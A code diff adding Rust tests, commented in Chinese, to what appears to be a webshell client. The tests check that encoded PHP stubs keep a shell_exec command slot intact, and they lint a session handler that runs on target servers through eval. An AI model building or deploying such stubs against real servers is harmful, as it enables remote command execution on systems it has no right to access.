+            // NATIVE 系列模板的 $_g[0] 本来就是命令函数槽位（符号表里索引 0 = shell_exec）
+            if id.starts_with("native") {
+                continue;
+            }
+            let encoder = EncoderRegistry::global().get(&id).expect("编码器应已注册");
+            for stub in [
+                encoder.stub("php", "secret"),
+                encoder.stub_session("php", "secret"),
+            ]
+            .into_iter()
+            .flatten()
+            {
+                assert!(
+                    !stub.contains("$_g[0]=") && !stub.contains("$_g[0] ="),
+                    "{id} 的 stub 不得覆盖 $_g[0]（解包槽位）"
+                );
+                checked += 1;
+            }
+        }
+        assert!(checked >= 14, "应检查到足够的 stub：{checked}");
+    }
+
+    /// 处理器经 eval 执行：语法错误在目标端只表现为「响应中未找到协议帧」，
+    /// 本地 `php -l` 比端到端失败便宜得多。
+    #[test]
+    fn session_handler_is_valid_php() {
+        match std::process::Command::new("php").arg("-v").output() {
+            Ok(output) if output.status.success() => output,
+            _ => {
+                eprintln!("跳过：未检测到 php 可执行文件");
+                return;
+            }
+        };
+        let dir = std::env::temp_dir().join(format!("dosword-lint-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("handler.php");
+        std::fs::write(&path, format!("<?php\n{}\n", session_handler_code())).unwrap();
+        let out = std::process::Command::new("php")
+            .arg("-l")
+            .arg(&path)
+            .output()
+            .expect("运行 php -l 失败");
+        let _ = std::fs::remove_dir_all(&dir);
+        assert!(
+            out.status.success(),
+            "处理器不是合法 PHP：{}{}",
+            String::from_utf8_lossy(&out.stdout),
+            String::from_utf8_lossy(&out.stderr)
         );
     }
 }
